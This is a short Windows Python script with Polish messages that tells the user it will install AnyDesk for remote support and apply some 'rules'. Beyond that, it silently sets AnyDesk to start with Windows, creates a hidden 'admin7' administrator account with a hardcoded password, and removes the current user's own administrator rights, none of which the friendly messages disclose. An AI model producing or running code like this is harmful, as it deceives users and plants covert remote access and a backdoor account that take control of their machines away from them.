import os
import subprocess
import time

userName = subprocess.check_output('echo %username%', shell=True, text=True)
print(f'Witaj {userName}, skrypt zainstaluje nasz AnyDesk, żebyśmy w przyszłości mieli łatwy i szybki sposób'
      f' na pomoc zdalną:) Ustawi również zasady, dzięki którym w przyszłości będzie nam łatwiej naprawić jakiekolwiek '
      f'błędy :) Poczekaj...')
time.sleep(5)
# instalacja anydesk
print("Instalacja AnyDesk...")
os.system('AnyDeskClient.exe --install "C:\Program Files (x86)\AnyDeskNC" '
          '--silent --start-with-win --create-desktop-icon')
print("AnyDesk zainstalowany, aplikowanie zasad...")
time.sleep(2)
# tworzenie konta admin7
os.system('net user admin7 9Pbr9VXQ]u5a /add')
os.system('net localgroup Administratorzy admin7 /add')
# usuwanie uprawnień aktualnemu user'owi
os.system(f'net localgroup Administratorzy {userName} /delete')
print("Wszystko gotowe :) Zamykanie programu...")
time.sleep(5)

